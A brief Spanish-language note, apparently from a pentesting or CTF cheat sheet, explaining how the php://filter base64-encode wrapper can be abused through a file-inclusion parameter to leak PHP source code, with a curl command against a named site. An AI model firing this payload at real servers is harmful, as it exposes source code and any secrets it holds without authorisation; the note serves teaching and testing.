Cuando encontramos recursos en un servidor web en forma de ficheros php, al acceder a ellos, el navegador los interpretará, pero no los mostrará por pantalla.

Una solución es utilizar un wrapper de php:
	php://filter/convert.base64-encode/resource=
	
Con este filtro añadido a una dirección donde se acceda a este recurso podemos recibir como respuesta una cadena en base64 con el contenido del fichero.

Ejemplo con curl:
	curl http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index